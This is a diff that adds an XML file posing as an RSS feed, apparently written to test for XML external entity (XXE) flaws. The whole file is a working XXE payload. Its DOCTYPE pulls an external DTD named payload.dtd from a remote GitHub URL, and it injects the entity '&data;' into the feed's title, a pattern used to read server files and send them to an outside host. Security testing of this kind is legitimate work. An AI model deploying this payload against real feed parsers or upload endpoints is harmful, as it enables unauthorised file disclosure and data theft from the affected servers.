@@ -1,0 +1,25 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [
+  <!ELEMENT rss ANY>
+  <!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/chrislam82/XML_test_82/master/payload.dtd">
+  %sp;
+]>
+<rss>
+    <channel>
+        <item>
+            <title>
+               &data;
+               title
+            </title>
+            <link>
+                hello
+            </link>
+            <description>
+                lol
+            </description>
+            <pubDate>
+                pubdate
+            </pubDate>
+        </item>
+    </channel>
+</rss>
